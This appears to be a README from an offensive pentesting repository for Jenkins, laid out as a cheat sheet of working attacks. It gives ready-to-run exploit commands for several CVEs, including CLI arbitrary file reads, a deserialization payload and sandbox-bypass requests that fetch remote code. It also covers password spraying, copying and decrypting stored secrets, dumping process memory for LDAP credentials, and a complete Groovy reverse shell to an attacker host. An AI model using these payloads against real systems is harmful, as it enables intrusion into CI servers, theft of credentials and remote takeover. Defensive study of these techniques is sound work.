<img src="/pwn_jenkins.png" width="640">

Remote Code Execution
=====================
Jenkins CLI arbitrary read (CVE-2024-23897 applies to versions below 2.442 and LTS 2.426.3)
-------------------------------------------
[Jenkins Advisory](https://www.jenkins.io/security/advisory/2024-01-24/), [Credits](https://www.sonarsource.com/blog/excessive-expansion-uncovering-critical-security-vulnerabilities-in-jenkins/)

Authenticated, can retrieve a complete file:
```
java -jar jenkins-cli.jar -noCertificateCheck -s https://xxx.yyy/jenkins -auth abc:abc connect-node "@/etc/passwd"
```

Unauthenticated or missing Global/Read permissions, can only read 3 lines:
Read first line:
```
java -jar jenkins-cli.jar -noCertificateCheck -s https://xxx.yyy/jenkins who-am-i "@/etc/passwd"
```
Read second line:
```
java -jar jenkins-cli.jar -noCertificateCheck -s https://xxx.yyy/jenkins enable-job "@/etc/passwd"
```
Read third line:
```
java -jar jenkins-cli.jar -noCertificateCheck -s https://xxx.yyy/jenkins keep-build "@/etc/passwd"
```

[How to bruteforce the credential encryption key.](https://www.errno.fr/bruteforcing_CVE-2024-23897.html)

Deserialization RCE in old Jenkins (CVE-2015-8103, Jenkins 1.638 and older)
---------------------------------------------------------------------------
Use [ysoserial](https://github.com/frohoff/ysoserial) to generate a payload.
Then RCE using [this script](./rce/jenkins_rce_cve-2015-8103_deser.py):

```bash
java -jar ysoserial-master.jar CommonsCollections1 'wget myip:myport -O /tmp/a.sh' > payload.out
./jenkins_rce.py jenkins_ip jenkins_port payload.out
```


Authentication/ACL bypass (CVE-2018-1000861, Jenkins <2.150.1)
--------------------------------------------------------------
[Jenkins Advisory](https://jenkins.io/security/advisory/2018-12-05/)

Details [here](https://blog.orange.tw/2019/01/hacking-jenkins-part-1-play-with-dynamic-routing.html).

If the Jenkins requests authentication but returns valid data using the following request, it is vulnerable:
```bash
curl -k -4 -s https://example.com/securityRealm/user/admin/search/index?q=a
```


Metaprogramming RCE in Jenkins Plugins (CVE-2019-1003000, CVE-2019-1003001, CVE-2019-1003002)
---------------------------------------------------------------------------------------------
[Jenkins Advisory](https://jenkins.io/security/advisory/2019-01-08)

Original RCE vulnerability [here](https://blog.orange.tw/2019/02/abusing-meta-programming-for-unauthenticated-rce.html), full exploit [here](https://github.com/petercunha/jenkins-rce).

Alternative RCE with Overall/Read and Job/Configure permissions [here](https://github.com/adamyordan/cve-2019-1003000-jenkins-rce-poc).


CheckScript RCE in Jenkins (CVE-2019-1003029, CVE-2019-1003030)
---------------------------------------------------------------
[Jenkins Advisory](https://jenkins.io/security/advisory/2019-03-06/), [Credits](https://twitter.com/webpentest).

Check if a Jenkins instance is vulnerable (needs Overall/Read permissions) with some Groovy:
```bash
curl -k -4 -X POST "https://example.com/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript/" -d "sandbox=True" -d 'value=class abcd{abcd(){sleep(5000)}}'
```
*Note: If you get a 403 error complaining about a missing crumb (which is a CSRF protection in Jenkins), you may be able to get the crumb value with a GET request to `https://example.com/crumbIssuer/api/json`. The crumb value shall then be added to the POST request in a `Jenkins-Crumb` Header.*

Execute arbitraty bash commands:
```bash
curl -k -4 -X POST "https://example.com/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript/" -d "sandbox=True" -d 'value=class abcd{abcd(){"wget xx.xx.xx.xx/bla.txt".execute()}}'
```

If you don't immediately get a reverse shell you can debug by throwing an exception:
```bash
curl -k -4 -X POST "https://example.com/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript/" -d "sandbox=True" -d 'value=class abcd{abcd(){def proc="id".execute();def os=new StringBuffer();proc.waitForProcessOutput(os, System.err);throw new Exception(os.toString())}}'
```

Git plugin (<3.12.0) RCE in Jenkins (CVE-2019-10392)
----------------------------------------------------
[Jenkins Advisory](https://jenkins.io/security/advisory/2019-09-12/), [Credits](https://iwantmore.pizza/posts/cve-2019-10392.html).

This one will only work is a user has the 'Jobs/Configure' rights in the security matrix so it's very specific.


CorePlague (CVE-2023-27898, CVE-2023-27905)
-------------------------------------------
[Jenkins Advisory](https://www.jenkins.io/security/advisory/2023-03-08/), [Credits](https://blog.aquasec.com/jenkins-server-vulnerabilities)

Note that this is only exploitable if using a *dedicated* and out-of-date [Update Center](https://www.jenkins.io/templates/updates/). Therefore most servers are not vulnerable.


Dumping builds to find cleartext secrets
========================================
Use [this script](./dump_builds/jenkins_dump_builds.py) to dump build console outputs and build environment variables to hopefully find cleartext secrets.

```
usage: jenkins_dump_builds.py [-h] [-u USER] [-p PASSWORD] [-o OUTPUT_DIR]
                              [-l] [-r] [-d] [-s] [-v]
                              url [url ...]

Dump all available info from Jenkins

positional arguments:
  url

optional arguments:
  -h, --help            show this help message and exit
  -u USER, --user USER
  -p PASSWORD, --password PASSWORD
  -o OUTPUT_DIR, --output-dir OUTPUT_DIR
  -l, --last            Dump only the last build of each job
  -r, --recover_from_failure
                        Recover from server failure, skip all existing
                        directories
  -d, --downgrade_ssl   Downgrade SSL to use RSA (for legacy)
  -s, --no_use_session  Don't reuse the HTTP session, but create a new one for
                        each request (for legacy)
  -v, --verbose         Debug mode
```

Password spraying
=================

Use [this python script](./password_spraying/jenkins_password_spraying.py) or [this powershell script](https://github.com/chryzsh/JenkinsPasswordSpray).


Files to copy after compromission
=================================

These files are needed to decrypt Jenkins secrets:

* secrets/master.key
* secrets/hudson.util.Secret

Such secrets can usually be found in:

* credentials.xml
* jobs/.../build.xml

Here's a regexp to find them:
```bash
grep -re "^\s*<[a-zA-Z]*>{[a-zA-Z0-9=+/]*}<"
```


Dumping LDAP credentials on a compromised machine
=================================================

If Jenkins is configured to verify user credentials by relaying them to a LDAP (which is retarded, but a common vulnerability in companies) it's possible to recover these cleartext user credentials by dumping the Java process' memory.
Assuming PID 7 for the Jenkins server the following loop will perform a memory dump of the stack every 30 seconds:
```bash
head -n 1 /proc/7/maps
a=<first hex number>
b=<second hex number>
while [ 1 ]; do dd if=/proc/7/mem bs=$(getconf PAGESIZE) iflag=skip_bytes,count_bytes skip=$((0x$a)) count=$((0x$b - 0x$a)) of=/tmp/tmp.bin; strings /tmp/tmp.bin | grep "uid=" && break; sleep 30; done
```
A small delay is important because the garbage collector will regularly free the credential structures.

Decrypt Jenkins secrets offline
===============================

Use [this script](./offline_decryption/jenkins_offline_decrypt.py) to decrypt previsously dumped secrets.

```
Usage:
	jenkins_offline_decrypt.py <jenkins_base_path>
or:
	jenkins_offline_decrypt.py <master.key> <hudson.util.Secret> [credentials.xml]
or:
	jenkins_offline_decrypt.py -i <path> (interactive mode)
```


Groovy Scripts
==============
Decrypt Jenkins secrets from Groovy
-----------------------------------

```java
println(hudson.util.Secret.decrypt("{...}"))
```


Command execution from Groovy
-----------------------------

```java
def proc = "id".execute();
def os = new StringBuffer();
proc.waitForProcessOutput(os, System.err);
println(os.toString());
```

Multiline shell command that can include pipes, redirects and stuff:

```java
def proc = ['bash', '-c', '''your_long_command_here'''].execute();
```

Automate it using [this script](./rce/jenkins_rce_admin_script.py).

Command execution on specific slave
-----------------------------------
By default execution happens on the master node. Use this script to execute on a specific slave:
```java
import hudson.util.RemotingDiagnostics
import jenkins.model.Jenkins

String agent_name = 'slave_name'

groovy_script = '''
def proc = ['cmd', '/c', 'cd D:\\\\ && dir data'].execute();
def os = new StringBuffer();
proc.waitForProcessOutput(os, System.err);
println(os.toString());
'''

String result
Jenkins.instance.slaves.find { agent ->
    agent.name == agent_name
}.with { agent ->
    result = RemotingDiagnostics.executeGroovy(groovy_script, agent.channel)
}
println result
```

Reverse shell from Groovy
-------------------------

```java
String host="myip";
int port=1234;
String cmd="/bin/bash";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();

```

I'll leave this reverse shell tip to recover a fully working PTY here in case anyone needs it:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
^Z bg
stty -a
echo $TERM
stty raw -echo
fg
export TERM=...
stty rows xx columns yy
```
